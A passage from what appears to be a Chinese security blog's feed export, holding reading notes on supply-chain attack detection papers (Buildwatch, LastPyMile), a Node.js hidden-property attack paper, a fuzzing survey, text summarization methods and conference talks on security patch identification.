src="https://blog-1253481369.cos.ap-chengdu.myqcloud.com/img/2350ba08-42d1-41c8-aaeb-d93536d47554.png"><br>Buildwatch主要还是针对在提交代码这个过程中加上了一个前置处理，用于检测这些代码中是否存在一些可疑的操作，然后与正常的版本进行diff操作，输出一份结果给使用者参考，例如：</p><p><img src="https://blog-1253481369.cos.ap-chengdu.myqcloud.com/img/980fae14-9810-4e8e-9681-570fa951cbe0.png"></p><h2 id="0x04-Conclusion"><a href="#0x04-Conclusion" class="headerlink" title="0x04 Conclusion"></a>0x04 Conclusion</h2><p>作者主要关注的是软件包迭代中的差异性，因为存在黑客入侵维护者PC修改源代码这类可能性，这也是供应链攻击中常见的一种攻击手法。于是，在维护者提交更新软件包之前可以运行作者实现的Buildwatch，用于发现那些可疑的新增敏感操作。</p><p>如此一来，人工审查静态代码的成本降低了很多，就如上图中所示，这样的结果输出是十分清晰明了的。但相应的也存在一些问题：</p><ol><li>如果恶意代码的入口部分存在着例如检测是否是沙箱环境等反调试代码，这个方法恐怕会出现一些问题</li><li>仅关注软件包迭代中引入的新操作是否会忽略掉这些软件包中本就存在的恶意代码，例如一开始就上传的是一个恶意软件包，后续的迭代包中也保持了这一段恶意代码</li><li>纯动态分析很多时候对于一些代码分支会执行不到，这一点可以考虑优先通过静态分析筛选，再进行动态分析。一是降低了动态分析的时间成本和资源成本，二是结合这两者的优点，可以做到一个速度与准确的相对平衡</li></ol>]]></content>
      
      
      <categories>
          
          <category> Paper Reading </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Supply Chain Attack </tag>
            
            <tag> ARES &#39;20 </tag>
            
            <tag> Dynamic Analysis </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>PR - Abusing Hidden Properties to Attack the Node.js Ecosystem</title>
      <link href="/2021/07/20/Abusing%20Hidden%20Properties%20to%20Attack%20the%20Node.js%20Ecosystem/"/>
      <url>/2021/07/20/Abusing%20Hidden%20Properties%20to%20Attack%20the%20Node.js%20Ecosystem/</url>
      
        <content type="html"><![CDATA[<blockquote><p><em>原文作者：F Xiao, J Huang, Y Xiong, G Yang, H Hu, G Gu</em></p><p><em>原文标题：Abusing Hidden Properties to Attack the Node.js Ecosystem</em></p><p><em>原文链接：<a href="https://www.usenix.org/system/files/sec21fall-xiao.pdf">https://www.usenix.org/system/files/sec21fall-xiao.pdf</a></em></p><p><em>原文来源：USENIX Security 2021</em></p><p><em>笔记作者：outx</em></p></blockquote><h2 id="0x01-Introduction"><a href="#0x01-Introduction" class="headerlink" title="0x01 Introduction"></a>0x01 Introduction</h2><p>由于目前还没有特别完善的针对JavaScript和Node.js程序中的安全风险的研究和理解。于是在本文中，作者定义了一种新型攻击手法用于说明在JavaScript和Node.js程序中也存在着一定的安全风险。这种攻击手法被命名为HPA(hidden property abusing)，攻击者可以利用其特性窃取机密数据、绕过安全检查并发起拒绝服务攻击，其实例如下图。<br><img src="https://blog-1253481369.cos.ap-chengdu.myqcloud.com/img/9ae954f3-b660-45a7-941b-7b8655b52315.png"></p><p>具体过程可以简单描述为：攻击者首先向服务端发送精心制作好的json数据，这个json数据会携带一个额外的而非服务端所期望的属性<code>I2</code>（被称之为隐藏属性）。接着服务端按照正常流程对该json数据进行处理，那么这个<code>I2</code>将会传播至一个内部对象中，如图中标红处，I2将覆盖内部对象的属性。一旦这些属性可以被攻击者所控制，那么攻击者就能够绕过一些安全检查，触发一些本不会触发的代码流程，例如下图中利用HPA绕过Node.js框架routing-controller的输入验证检测。<br><img src="https://blog-1253481369.cos.ap-chengdu.myqcloud.com/img/5011f3d8-d332-4c81-899f-7ca302dfd9c1.png"></p><h2 id="0x02-Contribution"><a href="#0x02-Contribution" class="headerlink" title="0x02 Contribution"></a>0x02 Contribution</h2><ul><li>定义了针对Node.js程序的隐藏属性滥用(hidden property abusing, HPA)攻击，并说明了其带来的严重的安全后果</li><li>设计并实现了LYNX，这是一个自动检测HPA漏洞并进行综合利用的工具</li><li>其结果评估揭示了实际情况下Npm软件包中的HPA问题，这会导致严重的安全问题</li></ul><h2 id="0x03-Hidden-Property-Abusing"><a href="#0x03-Hidden-Property-Abusing" class="headerlink" title="0x03 Hidden Property Abusing"></a>0x03 Hidden Property Abusing</h2><p>在JavaScript中，每个对象都有一个指向原型对象的链接。当程序要访问一个对象的某个属性时，该属性不仅会在该对象上搜索，而且会在该对象的原型上搜索（甚至在原型的原型上搜索），直到找到一个名称匹配的属性。因此，每个对象除了自己的属性外，还有许多继承的属性。然而，如果有一个冲突的名称属性位于搜索树的更高层次，这样的继承链就会被劫持。</p><p>需要注意的是这与原型链污染不同，具体来说原型污染需要对原型进行修改，而HPA并不需要这么做，其本质上只是劫持而非修改。</p><h2 id="0x04-Lynx设计与实现"><a href="#0x04-Lynx设计与实现" class="headerlink" title="0x04 Lynx设计与实现"></a>0x04 Lynx设计与实现</h2><h3 id="隐藏属性的定义"><a href="#隐藏属性的定义" class="headerlink" title="隐藏属性的定义"></a>隐藏属性的定义</h3><p>给定一个模块，其包含一个输入对象和一个内部对象。满足以下条件便定义一个属性P为输入对象中的隐藏属性：</p><ol><li>这个属性P属于内部对象，且在这个模块中被引用</li><li>当发生属性重名问题时，内部对象的属性P能够被外部对象的属性P所覆盖</li><li>属性P并不是输入对象的默认参数</li></ol><h3 id="挑战与解决方案"><a href="#挑战与解决方案" class="headerlink" title="挑战与解决方案"></a>挑战与解决方案</h3><h4 id="如何发现Node-js程序的隐藏属性"><a href="#如何发现Node-js程序的隐藏属性" class="headerlink" title="如何发现Node.js程序的隐藏属性?"></a>如何发现Node.js程序的隐藏属性?</h4><p>作者设计了一种结合了动态和静态分析各自优势的方法用以发现隐藏属性。首先，利用了一个轻量级的标记系统来动态跟踪输入对象和相关属性载体，并将属性载体的所有属性作为隐藏属性候选。为了尽可能多地发现执行路径，尤其是一些关键路径，作者对输入对象进行了广泛地递归标记，并对目标程序进行了测试。但上述的动态测试还是会造成一些假阴性，这是因为很多时候即使相应的属性载体被标记了，最为重要的隐藏属性却被忽略了。为了缓解这个问题，作者通过贪婪算法搜索那些被忽略的属性，然后引入静态分析。最终，得到一个隐藏属性候选列表。</p><h4 id="在大量的隐藏属性中，如何确定哪些属性对攻击者而言是有价值和可利用的？"><a href="#在大量的隐藏属性中，如何确定哪些属性对攻击者而言是有价值和可利用的？" class="headerlink" title="在大量的隐藏属性中，如何确定哪些属性对攻击者而言是有价值和可利用的？"></a>在大量的隐藏属性中，如何确定哪些属性对攻击者而言是有价值和可利用的？</h4><p>作者利用符号执行来探索所有相关的路径，收集路径约束，检测敏感行为，并最终生成漏洞利用方案。</p><h3 id="设计总览"><a href="#设计总览" class="headerlink" title="设计总览"></a>设计总览</h3><p><img src="https://blog-1253481369.cos.ap-chengdu.myqcloud.com/img/ad4e1c43-6796-4bde-bfe8-3acdd7d21c70.png"><br>第一部分，LYNX会动态地运行一个标记系统，用于递归地跟踪输入对象，并尽可能多地识别属性载体。然后通过收集上述标记结果，引入静态分析来搜索那些被忽略的隐藏属性，构建隐藏属性候选列表。</p><p>第二部分，LYNX首先利用第一部分得到的隐藏属性候选列表生成漏洞模板，运行符号执行来推理得出隐藏属性的值，以此验证其有害性及攻击结果。</p><h2 id="0x05-局限性"><a href="#0x05-局限性" class="headerlink" title="0x05 局限性"></a>0x05 局限性</h2><ul><li>依赖外部输入来触发分析过程</li><li>与其他动态分析工具一样，存在许多的假阴性</li><li>并没有覆盖完整的Node.js生态</li></ul>]]></content>
      
      
      <categories>
          
          <category> Paper Reading </category>
          
      </categories>
      
      
        <tags>
            
            <tag> OSS Security </tag>
            
            <tag> Node.js </tag>
            
            <tag> Code Analysis </tag>
            
            <tag> USENIX Security 2021 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>RL - Automatic Text Summary Method</title>
      <link href="/2021/07/12/Automatic%20Text%20Summary%20Method/"/>
      <url>/2021/07/12/Automatic%20Text%20Summary%20Method/</url>
      
        <content type="html"><![CDATA[<blockquote><p><em>原文作者：Wei Wang</em></p><p><em>原文标题：Generated Automatic Summary Method Based on C-R Neural</em></p><p><em>原文链接：<a href="https://d.wanfangdata.com.cn/periodical/jsjyszgc202001022">https://d.wanfangdata.com.cn/periodical/jsjyszgc202001022</a></em></p><p><em>原文来源：WanFang</em></p><p><em>笔记作者：outx</em></p></blockquote><h1 id="生成式自动摘要方法"><a href="#生成式自动摘要方法" class="headerlink" title="生成式自动摘要方法"></a>生成式自动摘要方法</h1><p>生成式文本摘要是更接近于人类思考方式的摘要生成方法，具有更强的生成、理解、表征文本的能力。生成式神经网络模型的基本结构是由编码和解码器组成，如下图</p><p><img src="https://blog-1253481369.cos.ap-chengdu.myqcloud.com/img/image-20210712155233413.png" alt="image-20210712155233413"></p><p>Seq2Seq 序列又称为编解码器（Encoder、Decoder）架构，编码器负责将输入文本编码成一个向量，作为原文本的表征，该向量包含了文本的上下文信息。而解码器从该向量提取重要信息，并进行剪辑加工，生成文本摘要，这套架构就是 Seq2Seq。 该方法被广泛应用于存在输入和输出序列的场景， Seq2Seq架构中的编码器和解码器通常由时间递归神经网络（RNN）或卷积神经网络（CNN）实现。</p><h2 id="基于RNN的生成式结构"><a href="#基于RNN的生成式结构" class="headerlink" title="基于RNN的生成式结构"></a>基于RNN的生成式结构</h2><p>“序列到序列”方法在很多文本处理中有很好的效果。相较于从原文本中抽取式获得摘要，从序列到序列建模处理方法，其摘要长度并不依赖于原文本长度，而且相对于原文摘要必然有信息损失。</p><p>Chopra等使用递归神经网络（RNN）作为解码器。(Abstractive Sentence Summarization with Attentive Recurrent Neural Networks)</p><h2 id="基于CNN的生成式结构"><a href="#基于CNN的生成式结构" class="headerlink" title="基于CNN的生成式结构"></a>基于CNN的生成式结构</h2><p>CNN的算法优势是可以提取出层次特征，并可以高效并行地进行卷积运算，根据其特点，可将CNN应用到相关文本任务中，但原生态的文本字符串无法进行计算，需将文本表示为分布式向量 （Distributed Representation/Word Embedding）。可以用一个实数矩阵或向量表示一句话或一个词，经过分布式向量表示后，就可以在文本任务中应用CNN。但CNN提取的文本特征，并不能如图像特征那样，有明显的可解释性和可视性。CNN 抽取的文本特征可以类比自然语言处理中的分析树（Syntactic Parsing Tree）。</p><p>Facebook 公司提出的 ConvS2S 模型，由 CNN 实现编码器和解码器，同时加入了注意力机制，尝试将该模型用于自动文本摘要。</p><h2 id="基于Attention的生成式结构"><a href="#基于Attention的生成式结构" class="headerlink" title="基于Attention的生成式结构"></a>基于Attention的生成式结构</h2><p>编码器将原文编码为向量V，而解码器从向量 V 中提取信息、获取语义、生成文本摘要。自注意力模型更加关注句子内部结构，即Word-Pairs的信息。模型单独学习目标端句子内部结构信息，利用编解码器注意力建立源文本和目标文本的对应关系。自注意力在第一层便巧妙地建立了词和整个句子的联系，其思想可用于文本摘要自动生成任务。</p><p>Google 团队使用自注意力（Self-Attention）和编解码器注意力（Encoder-Decoder Attention），来完全实现端到端任务。</p>]]></content>
      
      
      <categories>
          
          <category> Research Learning </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Text Summery </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>PR - LastPyMile: Identifying the Discrepancy between Sources and Packages</title>
      <link href="/2021/06/25/LastPyMile%20-%20Identifying%20the%20Discrepancy%20between%20Sources%20and%20Packages/"/>
      <url>/2021/06/25/LastPyMile%20-%20Identifying%20the%20Discrepancy%20between%20Sources%20and%20Packages/</url>
      
        <content type="html"><![CDATA[<blockquote><p><em>原文作者：Duc-Ly Vu, Fabio Massacci, Ivan Pashchenko, Henrik Plate</em></p><p><em>原文标题：LastPyMile: Identifying the Discrepancy between Sources and Packages</em></p><p><em>原文链接：<a href="https://securitylab.disi.unitn.it/lib/exe/fetch.php?media=research_activities:experiments:esecfse2021.pdf">https://securitylab.disi.unitn.it/lib/exe/fetch.php?media=research_activities:experiments:esecfse2021.pdf</a></em></p><p><em>原文来源：ESEC/FSE 2021</em></p><p><em>笔记作者：outx</em></p></blockquote><h1 id="主要内容"><a href="#主要内容" class="headerlink" title="主要内容"></a>主要内容</h1><p>通常情况下开源的软件包会在其对应的存储库上提供源代码，但开发者往往更倾向于使用集成式的包管理器来使用这些开源软件包（PyPI对应的pip）。这种方便的做法是假设源代码和软件包之间没有差异的，这会带来一定的安全风险。作者提出并实现了一种方法，名为LastPyMile，主要用于识别软件包的构造和其源代码库之间的差异，以防止恶意软件的注入。</p><p>以PyPI为例，作者做了详细的调查。下图为PyPI包的生命周期</p><p><img src="https://blog-1253481369.cos.ap-chengdu.myqcloud.com/img/image-20210625145547515.png" alt="image-20210625145547515"></p><p>作者致力于审查代码注入的问题， 而代码注入攻击中，往往只会有少量代码被修改。于是从这一点出发作者提出了三个问题：</p><h2 id="RQ1-能否有效地识别差异？"><a href="#RQ1-能否有效地识别差异？" class="headerlink" title="RQ1: 能否有效地识别差异？"></a>RQ1: 能否有效地识别差异？</h2><p>有一种现成的解决方案，即git log，但是由于git日志需要循环查看所有修订版，而且每次调用都会产生一个进程，这无疑是增加了分析机器的负担。作者的解决办法则是通过巧妙地结合软件包和运行软件的所有必需项目的散列值，以一种可扩展的方式提取这些差异。</p><p><strong>Answer</strong></p><ol><li>LastPyMile迭代所有的提交，以计算所有的文件哈希值并收集源代码库中的行内容。</li><li>LastPyMile处理一个软件包运行所需要的组件来计算文件哈希值并收集文件行数。</li><li>LastPyMile将所有计算好的文件哈希值和行数与源代码库中的文件哈希值和行数进行比较，报告那些差异性文件和行数。</li></ol><h2 id="RQ2-源代码和包存储库之间的“正常”差异有多大？"><a href="#RQ2-源代码和包存储库之间的“正常”差异有多大？" class="headerlink" title="RQ2: 源代码和包存储库之间的“正常”差异有多大？"></a>RQ2: 源代码和包存储库之间的“正常”差异有多大？</h2><p>作者研究了PyPI生态中超过2000个流行的软件包，这种差异是普遍存在的。但在Python源文件中一般只会发生很少的修改，所以作者采用审查作为替代方案。</p><p><strong>Answer</strong></p><ol><li>比较PyPI中的代码和相应的源代码库，平均有5.8%的运行时需要文件和2.6%的普通文件有差异。</li></ol><p>作者提到了可疑APIs的调用，说不能简单地将调用定义为可疑，会产生大量告警。这里存疑，因为告警和漏报的平衡点实在是很难界定。</p><h2 id="RQ3-LastPyMile能否与软件包扫描器相结合，同时保持可控的警报数量？"><a href="#RQ3-LastPyMile能否与软件包扫描器相结合，同时保持可控的警报数量？" class="headerlink" title="RQ3: LastPyMile能否与软件包扫描器相结合，同时保持可控的警报数量？"></a>RQ3: LastPyMile能否与软件包扫描器相结合，同时保持可控的警报数量？</h2><p>为了在该领域发挥效力，我们应该允许开发者和开发组织使用相同的工具来扫描软件包的源代码库，作为其审查过程的一部分。结合LastPyMile可以显著降低现有检测软件的告警数量</p><h1 id="TODO"><a href="#TODO" class="headerlink" title="TODO"></a>TODO</h1><p>恶意代码可以隐藏在许多其他形式中，如网页（嵌入或外部JavaScript的HTML）或配置文件（带有恶意依赖的requirements.txt）。我们注意到大量的依赖性声明文件requirements.txt，其中包含使用pip install自动安装的依赖性列表。</p><p>确实，往往技艺不精的开发者拿着一个可重用安装包的时候是不太会关心requirements.txt里到底有哪些包，这些包又是哪些版本（是不是能够被攻击者攻击利用的版本），一旦执行了pip install -r requirements.txt，就会顺序安装所有条目，这老实说是有潜在风险的，可以研究。</p>]]></content>
      
      
      <categories>
          
          <category> Paper Reading </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Supply Chain Attack </tag>
            
            <tag> ESEC/FSE 2021 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>PR - Fuzzing: a survey</title>
      <link href="/2021/06/18/Fuzzing%20-%20a%20survey/"/>
      <url>/2021/06/18/Fuzzing%20-%20a%20survey/</url>
      
        <content type="html"><![CDATA[<blockquote><p><em>原文作者：J Li, B Zhao, C Zhang</em></p><p><em>原文标题：Fuzzing a survey</em></p><p><em>原文链接：<a href="https://seclab.bu.edu/papers/cname_cloaking-asiaccs2021.pdf">https://seclab.bu.edu/papers/cname_cloaking-asiaccs2021.pdf</a></em></p><p><em>原文来源：<a href="https://cybersecurity.springeropen.com/">Cybersecurity</a></em></p><p><em>笔记作者：outx</em></p></blockquote><h1 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h1><p>​    互联网和世界数字经济运行在一个共享的、关键的开源软件（OSS）基础设施上。单个库中的安全缺陷可能会产生严重后果。例如，OpenSSL实现了用于安全通信的协议，并被包括大多数HTTPS网站在内的Internet服务器广泛使用。早期版本的OpenSSL中的“心脏滴血”漏洞会泄露机密数据并造成巨大的经济损失。目前，fuzzing是这方面最有前途的技术之一，现阶段有三种主要的fuzzing技术：黑盒，灰盒和白盒fuzzing。</p><p>​    黑盒fuzzing是在不了解程序内部构造的情况下产生输入的。其有两个主要的变种：突变型和生成型。在突变型黑盒fuzzing中，fuzzing从一个或多个种子输入开始。这些种子被修改以产生新的输入。随机突变被应用于输入中的随机位置。在生成型黑fuzzing中，输入是从头开始生成的。 如果提供了输入格式的结构规范，就会以此生成符合语法规范的新输入。Peach是一个流行的黑盒fuzzing工具。</p><p>​    灰盒fuzzing往往会利用程序来获得轻量级的反馈，用于指导fuzzer的工作。通常来说，程序中的一些控制位置在编译时进行检测，并提供初始种子语料库。 种子输入被改变以产生新的输入。产生的输入覆盖了新的控制位置，从而增加了代码覆盖率，进而被添加到种子语料库中。覆盖率反馈允许灰盒fuzzing逐渐深入到代码中。为了识别错误和漏洞，清理程序会将断言注入到程序中。现有的灰盒Fuzzing工具包括AFL、LibFuzzer和Honggfuzz。</p><p>​    白盒fuzzing技术是基于一种叫做符号执行的技术，它使用程序分析和约束解算器来系统地列举可能出现漏洞的程序路径。 在白盒fuzzing中用作后台的约束解算器是Satisfiability Modulo Theory(SMT)解算器，它允许对（无量子）一阶逻辑公式进行推理，其平等和函数/谓语符号来自不同的背景理论。白盒fuzzer会计算一个输入i的路径条件与i走过相同路径的输入集合。给定一个种子输入，计算并改变路径条件（与改变程序输入相反）。改变路径条件然后被发送到约束解算器以生成新的输入。这种技术的主要优点是其能够通过跟踪到目前为止的所有输入的路径条件，生成一个穿过新路径（新控制流）的输入。现有的白盒模糊工具包括KLEE和SAGE。</p><h1 id="Fuzzing原理"><a href="#Fuzzing原理" class="headerlink" title="Fuzzing原理"></a>Fuzzing原理</h1><h2 id="Fuzzing的工作流程"><a href="#Fuzzing的工作流程" class="headerlink" title="Fuzzing的工作流程"></a>Fuzzing的工作流程</h2><p>​    下图描述了传统Fuzzing的工作流程，由四个主要阶段组成，即测试用例生成阶段、测试用例运行阶段、程序执行状态监控和异常分析。</p><p><img src="https://blog-1253481369.cos.ap-chengdu.myqcloud.com/img/image-20210618145110707.png" alt="image-20210618145110707"></p><p>​    Fuzzing是从生成一堆程序输入开始的，也就是测试用例。生成的测试用例的质量直接影响测试效果。输入应该尽可能地满足被测程序对输入格式的要求。而另一方面，输入应该足够碎片化，以便在图1的模糊测试工作过程中导致程序执行出现问题。根据目标程序，输入可以是不同文件格式的文件、网络通信数据、具有特定特征的可执行二进制文件等。如何产生足够多的测试用例是现阶段Fuzzing的主要挑战。一般来说，最先进的模糊器使用两种生成器，即基于生成的生成器和基于变异的生成器。测试用例在上一阶段生成后被送入目标程序。模糊器自动启动和完成目标程序的过程，并驱动目标程序的测试用例处理过程。在执行之前，分析人员可以配置目标程序的启动和结束方式，并预先定义参数和环境变量。通常情况下，模糊处理过程会在预定义的超时、程序执行挂起或崩溃时停止。Fuzzer会在目标程序的执行过程中监测执行状态，期待异常和崩溃。常用的异常监测方法包括对特定系统信号的监测、崩溃和其他违规行为。对于没有直观程序异常行为的违规行为，可以使用很多工具，包括AddressSanitizer、DataFlowsanitizer、ThreadSanitizer、LeakSanitizer等。当捕捉到违规行为时，Fuzzer会存储相应的测试用例，供后者回放和分析。在分析阶段，分析员试图确定捕获的违规行为的位置和根本原因。分析通常在调试器的帮助下进行，如GDB、windbg，或其他二进制分析工具，如IDAPro、OllyDbg等。二进制工具，如Pin，也可以用来监测收集的测试用例的确切执行状态，如线程信息、指令、寄存器信息等等。</p><h2 id="Fuzzer的分类"><a href="#Fuzzer的分类" class="headerlink" title="Fuzzer的分类"></a>Fuzzer的分类</h2><p>​    Fuzzer可以以各种方式进行分类，主要分为基于生成的和基于突变的[8]。</p><p>​    对于基于生成的Fuzzer，需要了解程序输入的知识。对于文件格式的Fuzzing，通常需要提供一个预先定义文件格式的配置文件。测试用例是根据配置文件生成的。有了给定的文件格式，由基于生成的Fuzzer生成的测试用例能够更容易地通过程序的验证，并更有可能测试目标程序的深层代码。然而，如果没有一个好的文件，分析文件格式是一项艰难的工作。因此，基于突变的Fuzzer更容易启动，也更适用。对于基于突变的模糊器，需要一组有效的初始输入。测试用例是通过初始输入的突变和Fuzzing过程中产生的测试用例产生的。下表中比较了基于生成的fuzzers和基于突变的fuzzers。</p><p><img src="https://blog-1253481369.cos.ap-chengdu.myqcloud.com/img/image-20210618145552977.png" alt="image-20210618145552977"></p><p>​    就对程序源代码的依赖性和程序分析的程度而言，Fuzzing技术可以被分为白盒、灰盒和黑盒。白盒可以接触到程序的源代码，因此可以通过对源代码的分析收集更多的信息，包括测试用例如何影响程序的运行状态。黑盒是指在不了解目标程序内部的情况下进行Fuzzing。灰盒测试在没有源代码的情况下也能工作，并通过程序分析获得目标程序的内部信息。下表中列出了一些常见的白盒、灰盒和黑盒fuzzer。</p><p><img src="https://blog-1253481369.cos.ap-chengdu.myqcloud.com/img/image-20210618145642592.png" alt="image-20210618145642592"></p><p>​    根据遍历程序代码的策略，可以将Fuzzer分为定向Fuzzing和基于覆盖的Fuzzing。有方向的Fuzzer旨在生成覆盖程序的目标代码和目标路径的测试用例，而基于覆盖的Fuzzer旨在生成覆盖尽可能多程序代码的测试用例。定向Fuzzing希望对程序进行更快的测试，而基于覆盖的Fuzzing则希望进行更彻底的测试，并尽可能地检测更多的错误。但对于这两种测试方法而言，如何提取执行路径的信息是一个关键问题。</p><p>​    根据对程序执行状态的监控和测试用例的生成之间是否存在反馈，可以将模糊器分为无反馈Fuzzer和智能Fuzzer。智能Fuzzer根据收集到的信息调整测试用例的生成，即测试用例如何影响程序行为。对于基于突变的Fuzzer，反馈信息可用于确定哪部分测试用例应该被突变以及突变的方式。无反馈Fuzzer获得了更好的测试速度，而智能Fuzzer产生了更好的测试用例并获得了更好的效率。</p><h1 id="Fuzzing中的关键挑战"><a href="#Fuzzing中的关键挑战" class="headerlink" title="Fuzzing中的关键挑战"></a>Fuzzing中的关键挑战</h1><p>​    传统的Fuzzer在实践中通常采用基于随机的Fuzzing策略。程序分析技术的局限性导致了现在的状况，即Fuzzer不够智能。因此，Fuzzing仍然面临许多挑战。我们列出一些关键的挑战如下：</p><h2 id="如何对种子输入进行突变"><a href="#如何对种子输入进行突变" class="headerlink" title="如何对种子输入进行突变"></a>如何对种子输入进行突变</h2><p>​    基于突变的生成策略因其方便和容易设置而被最先进的Fuzzer广泛使用[9]。然而，如何变异并生成能够覆盖更多程序路径和更容易触发错误的测试用例是一个关键的挑战。具体来说，基于突变的Fuzzer在进行突变时需要解决两个问题：</p><ul><li>在哪里突变</li><li>如何突变</li></ul><p>​    只有少数关键位置的突变会影响执行的控制流程。因此，如何定位这些关键位置是非常重要的。此外，Fuzzer对关键位置的突变方式是另一个关键问题，即如何确定可以将测试引向程序的有潜在危险路径的值。总而言之，盲目的突变测试用例会造成测试资源的严重浪费，而更好的突变策略可以显著提高模糊测试的效率。</p><h2 id="低代码覆盖率"><a href="#低代码覆盖率" class="headerlink" title="低代码覆盖率"></a>低代码覆盖率</h2><p>​    更高的代码覆盖率代表了更高的程序执行状态覆盖率，以及更彻底的测试。先前的一些工作已经证明，覆盖率越高，发现问题的概率就越大。然而，大多数测试用例只覆盖了相同的几条路径，而大部分的代码逻辑却无法触及。因此，仅仅通过大量的测试用例生成和投入测试资源来实现高覆盖率并不是一个明智的选择。基于覆盖率的Fuzzer将在程序分析技术的帮助下解决这个问题，比如程序分析工具。</p><h2 id="通过验证"><a href="#通过验证" class="headerlink" title="通过验证"></a>通过验证</h2><p>​    程序通常在解析和处理之前对输入进行验证。验证的作用是保护程序，节省计算资源，保护程序免受无效输入和恶意构建的输入所造成的损害。无效的测试用例总是被忽略或丢弃的。Magic numbers、Magic strings、版本号检查和校验是程序中常用的验证方法。黑盒和灰盒Fuzzer生成的测试用例很难通过生成策略的验证，这会导致Fuzzing处理的效率相当低。因此，如何通过验证是另一个关键挑战。</p><h1 id="Fuzzing的新趋势"><a href="#Fuzzing的新趋势" class="headerlink" title="Fuzzing的新趋势"></a>Fuzzing的新趋势</h1><p>​    作为一种自动检测漏洞的方法，Fuzzing已经显示出它的高效力和高效率。然而，正如第三节所述，仍有许多挑战需要解决。在本节中，我们简单介绍一下自己关于Fuzzing发展趋势的理解。</p><p>​    首先，智能Fuzzing技术为Fuzzing的改进提供了更多可能性。在以前的工作中，传统的静态和动态分析被整合到Fuzzing中，以帮助改善这一过程。整体上来看已经有了一定的改进，但还是很有限。智能Fuzzing技术通过各种方式收集目标程序的执行信息，能够对Fuzzing过程进行了更精细的控制，并提出了很多Fuzzing策略。随着对不同类型漏洞的深入了解，并利用漏洞的特点进行模糊处理，智能模糊处理可以帮助发现更复杂的漏洞。</p><p>​    第二，新技术可以在许多方面帮助改善脆弱性。机器学习和相关技术等这类新兴技术已经被用来改善模糊测试中的测试用例生成。如何将新技术的优势和特点与Fuzzing结合起来，如何将Fuzzing中的关键挑战转化或分割成新技术所擅长的问题，是另一个值得考虑的问题。</p><p>​    第三，新的系统特征和硬件特征也不应该被忽视。根据前人的一些工作我们可以知道新的硬件特性能够极大地提高Fuzzing的效率。</p><h1 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h1><p>​    Fuzzing是目前最有效和最高效的漏洞发现方案。在本文中，我们对Fuzzing方法及其最新进展做了全面的回顾和总结。首先我们介绍了Fuzzing的基本原理和工作流程，然后我们介绍了Fuzzing的基本分类标准。同时，我们还介绍了Fuzzing在这些年的发展过程中遇到的问题和挑战。最后，我们总结了与Fuzzing相结合的技术，以及Fuzzing的应用和可能的新趋势。</p>]]></content>
      
      
      <categories>
          
          <category> Paper Reading </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Survey </tag>
            
            <tag> Fuzzing </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Conference - InForSec</title>
      <link href="/2021/06/06/Inforsec%20Learning/"/>
      <url>/2021/06/06/Inforsec%20Learning/</url>
      
        <content type="html"><![CDATA[<blockquote><p><em>北京之旅</em></p></blockquote><h1 id="Session-1"><a href="#Session-1" class="headerlink" title="Session 1"></a>Session 1</h1><h2 id="Precisely-Characterizing-Security-Impact-in-a-Floodof-Patches-via-Symbolic-Rule-Comparison"><a href="#Precisely-Characterizing-Security-Impact-in-a-Floodof-Patches-via-Symbolic-Rule-Comparison" class="headerlink" title="Precisely Characterizing Security Impact in a Floodof Patches via Symbolic Rule Comparison"></a>Precisely Characterizing Security Impact in a Floodof Patches via Symbolic Rule Comparison</h2><p><strong><em>Q: 为什么要识别与安全相关的 bug？</em></strong><br>作者在探究之初提出了上述这个问题，然后围绕这个问题进行了很多思考，得出了以下的两点继续研究的动机;</p><ol><li>bug 报告数量很大</li><li>补丁与代码的传播不及时</li></ol><p>以上两点总结起来可以理解为现有的一些项目或者代码的维护者的数量是有限的，同时每个人的精力也是有限的。对于每天上报的 bug 报告，维护者很难及时和全面的审查这些报告。为此，作者提出了以下 Goal：</p><p><strong><em>Goal: 识别与安全相关的漏洞补丁</em></strong><br>具体来说，识别与安全相关的漏洞补丁能够让一些项目或者代码的维护者能够及时的打上那些威胁严重的安全漏洞补丁以防止被恶意攻击者攻击，而不用耗费精力在修复那些无关紧要的 bug。</p><p><strong>传统方法</strong><br>传统的识别方法主要有：</p><ol><li>文本分析：主要是依靠关键字分析</li><li>统计分析：主要是依靠分析趋势</li></ol><p>但传统方法具有很明显的局限性，一是其精度难以保证，二是维护者难以判断 bug 的影响力。</p><p><strong>通用代码安全规则和违规行为</strong></p><ol><li>界内访问（内存、数组）—— 越界访问(out-of-bound access)</li><li>不允许指针等 free 后被再使用 —— free 后重用(use-after-free)</li><li>变量应初始化后使用 —— 未初始化使用(uninitialized use)</li><li>敏感操作前的权限检查 —— 绕过权限(permission bypass)</li></ol><p><img src="https://blog-1253481369.cos.ap-chengdu.myqcloud.com/img/9a3cab95-0dd9-4d1d-b526-7527e7741f65.png"></p><p>基于以上通用代码安全规则和其对应的违规行为，作者提出了一个定义：给定一个代码和补丁，在没有打补丁的情况下，代码会违反以上安全规则。</p><p><strong>SID 整体结构</strong><br>根据上述定义，作者提出了 SID，这是一个基于 LLVM 的解决方案，其框架如下<br><img src="https://blog-1253481369.cos.ap-chengdu.myqcloud.com/img/d90df980-318e-4d96-8d8a-c78097e800b2.png"></p><p>主要分为三部分：预处理，剖析补丁，符号规则比较</p><ol><li>预处理</li></ol><p>在预处理部分，作者首先根据 bug 补丁将软件的版本分为打了补丁的版本和没有打补丁的版本，然后分别调用 LLVM 将其编译为对应的 LLVM IRS。</p><ol start="2"><li>剖析补丁</li></ol><p>主要是通过静态分析来对不同版本的代码进行分析。在这个阶段，SID 根据补丁模型对补丁进行剖析，以确定关键组件。SID 首先识别出打过补丁和没有打过补丁的版本中的安全操作。接下来，SID 对关键变量进行数据流分析，以收集存在漏洞的代码片段。</p><ol 